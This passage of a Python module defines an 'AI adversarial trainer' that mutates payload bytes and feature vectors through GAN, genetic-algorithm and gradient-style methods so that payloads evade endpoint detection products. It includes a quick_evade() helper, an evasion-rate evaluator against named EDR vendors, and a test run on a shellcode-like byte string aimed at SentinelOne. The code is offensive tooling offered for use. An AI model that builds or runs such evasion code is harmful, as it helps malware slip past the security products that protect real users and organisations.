        return self.attacker.cw_attack(features.feature_vector)
    
    def _deepfool_evasion(self, features: PayloadFeatures) -> Any:
        """DeepFool evasion"""
        if features.feature_vector is None:
            return features.feature_vector
        return self.attacker.deepfool_attack(features.feature_vector)
    
    def _gan_evasion(self, features: PayloadFeatures) -> Any:
        """GAN-based evasion"""
        if features.feature_vector is None:
            return features.feature_vector
        
        perturbation = self.mutator.generate_perturbation(features.feature_vector)
        if perturbation is not None and HAS_NUMPY:
            return features.feature_vector + perturbation * 0.1
        return features.feature_vector
    
    def _genetic_evasion(self, features: PayloadFeatures) -> Any:
        """Genetic algorithm-based evasion"""
        if not HAS_NUMPY or features.feature_vector is None:
            return features.feature_vector
        
        population_size = 20
        generations = 50
        mutation_rate = 0.1
        
        # Initialize population
        population = [
            features.feature_vector + np.random.randn(*features.feature_vector.shape) * 0.05
            for _ in range(population_size)
        ]
        
        best = features.feature_vector
        best_score = self._get_detection_score(features)
        
        for gen in range(generations):
            # Evaluate fitness (lower score = better)
            fitness = []
            for individual in population:
                temp_features = PayloadFeatures(
                    raw_bytes=features.raw_bytes,
                    feature_vector=np.clip(individual, 0, 1)
                )
                score = self._get_detection_score(temp_features)
                fitness.append((score, individual))
            
            # Sort by fitness
            fitness.sort(key=lambda x: x[0])
            
            # Update best
            if fitness[0][0] < best_score:
                best_score = fitness[0][0]
                best = fitness[0][1].copy()
            
            # Early termination
            if best_score < self.config.confidence_threshold:
                break
            
            # Selection (top 50%)
            selected = [f[1] for f in fitness[:population_size//2]]
            
            # Crossover and mutation
            new_population = selected.copy()
            while len(new_population) < population_size:
                p1, p2 = random.sample(selected, 2)
                # Crossover
                mask = np.random.rand(*p1.shape) > 0.5
                child = np.where(mask, p1, p2)
                # Mutation
                if random.random() < mutation_rate:
                    child += np.random.randn(*child.shape) * 0.02
                child = np.clip(child, 0, 1)
                new_population.append(child)
            
            population = new_population
        
        return best
    
    def _combined_evasion(self, features: PayloadFeatures) -> Any:
        """Combine multiple evasion techniques"""
        if features.feature_vector is None:
            return features.feature_vector
        
        best = features.feature_vector
        best_score = float('inf')
        
        # Try each method
        methods = [
            self._fgsm_evasion,
            self._pgd_evasion,
            self._gan_evasion
        ]
        
        for method in methods:
            try:
                result = method(features)
                if result is not None:
                    temp_features = PayloadFeatures(
                        raw_bytes=features.raw_bytes,
                        feature_vector=result if HAS_NUMPY else features.feature_vector
                    )
                    score = self._get_detection_score(temp_features)
                    if score < best_score:
                        best_score = score
                        best = result
            except Exception as e:
                logger.debug(f"Method {method.__name__} failed: {e}")
        
        return best
    
    def _apply_evasion(self, payload: bytes, original_features: PayloadFeatures,
                       target_features: Any) -> Tuple[bytes, List[str]]:
        """Apply evasion to actual payload bytes"""
        mutations = []
        mutated = payload
        
        # Apply GAN mutations
        mutated = self.mutator.mutate(mutated, self.config.confidence_threshold)
        mutations.append("gan_mutation")
        
        # Additional mutations based on evasion level
        if self.config.evasion_level in ['high', 'paranoid']:
            # More aggressive mutations
            for _ in range(3):
                mutated = self.mutator.mutate(mutated)
            mutations.append("aggressive_mutation")
        
        # Ensure payload integrity (basic check)
        if len(mutated) < len(payload) // 2:
            # Something went wrong, return with minimal changes
            mutated = bytearray(payload)
            mutated = self.mutator._nop_insertion(mutated)
            mutations = ["minimal_nop_insertion"]
        
        return bytes(mutated), mutations
    
    def batch_train(self, payloads: List[bytes]) -> List[AdversarialResult]:
        """Generate adversarial examples for multiple payloads"""
        results = []
        for payload in payloads:
            result = self.train_adversarial(payload)
            results.append(result)
        return results
    
    def evaluate_evasion_rate(self, payloads: List[bytes], 
                              target_edr: Optional[EDRVendor] = None) -> Dict[str, float]:
        """Evaluate evasion success rate against target EDR"""
        original_edr = self.config.target_edr
        if target_edr:
            self.config.target_edr = target_edr
        
        total = len(payloads)
        successes = 0
        score_reductions = []
        
        for payload in payloads:
            result = self.train_adversarial(payload)
            if result.evasion_success:
                successes += 1
            score_reductions.append(result.original_score - result.adversarial_score)
        
        self.config.target_edr = original_edr
        
        return {
            "evasion_rate": successes / total if total > 0 else 0,
            "average_score_reduction": sum(score_reductions) / len(score_reductions) if score_reductions else 0,
            "total_tested": total,
            "successful_evasions": successes
        }
    
    def save_model(self, path: str):
        """Save trained models"""
        os.makedirs(os.path.dirname(path), exist_ok=True)
        
        for vendor, model in self.models.items():
            if isinstance(model, NeuralEDRModel) and model.model is not None:
                model_path = os.path.join(path, f"{vendor.value}_model")
                if HAS_TF and isinstance(model.model, tf.keras.Model):
                    model.model.save(model_path + ".h5")
                elif HAS_TORCH:
                    torch.save(model.model.state_dict(), model_path + ".pt")
        
        # Save config
        config_path = os.path.join(path, "config.json")
        with open(config_path, 'w') as f:
            json.dump({
                "evasion_level": self.config.evasion_level,
                "target_edr": self.config.target_edr.value,
                "attack_method": self.config.attack_method.value
            }, f, indent=2)
    
    def load_model(self, path: str):
        """Load trained models"""
        config_path = os.path.join(path, "config.json")
        if os.path.exists(config_path):
            with open(config_path) as f:
                config_data = json.load(f)
                self.config.evasion_level = config_data.get("evasion_level", "high")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get training statistics"""
        return {
            **self.stats,
            "success_rate": (self.stats["successful_evasions"] / self.stats["total_generated"]
                           if self.stats["total_generated"] > 0 else 0),
            "config": {
                "evasion_level": self.config.evasion_level,
                "target_edr": self.config.target_edr.value,
                "attack_method": self.config.attack_method.value
            }
        }


# Convenience functions
def create_adversarial_trainer(evasion_level: str = 'high',
                                target_edr: str = 'generic',
                                attack_method: str = 'gan') -> AIAdversarialTrainer:
    """Factory function to create adversarial trainer"""
    config = AdversarialConfig(
        evasion_level=evasion_level,
        target_edr=EDRVendor(target_edr.lower()),
        attack_method=AttackMethod(attack_method.lower())
    )
    return AIAdversarialTrainer(config)


def quick_evade(payload: bytes, target_edr: str = 'generic') -> bytes:
    """Quick function to generate evasive payload"""
    trainer = create_adversarial_trainer(target_edr=target_edr)
    result = trainer.train_adversarial(payload)
    return result.adversarial_payload


# Example usage and testing
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Test payload
    test_payload = b'\xfc\xe8\x82\x00\x00\x00' + b'\x90' * 100 + b'CreateProcess\x00'
    
    # Create trainer
    trainer = AIAdversarialTrainer(evasion_level='high', target_edr='sentinelone')
    
    # Generate adversarial
    result = trainer.train_adversarial(test_payload)
    
    print(f"\n{'='*60}")
    print("AI Adversarial Training Result")
    print(f"{'='*60}")
    print(f"Original Score:    {result.original_score:.4f}")
    print(f"Adversarial Score: {result.adversarial_score:.4f}")
    print(f"Evasion Success:   {result.evasion_success}")
    print(f"Mutations Applied: {result.mutations_applied}")
    print(f"Generation Time:   {result.generation_time:.2f}s")
    print(f"Target EDR:        {result.target_edr}")
    print(f"Attack Method:     {result.attack_method}")
    print(f"Original Size:     {len(result.original_payload)}")
    print(f"Adversarial Size:  {len(result.adversarial_payload)}")
    
    # Stats
    print(f"\nTrainer Stats: {trainer.get_stats()}")
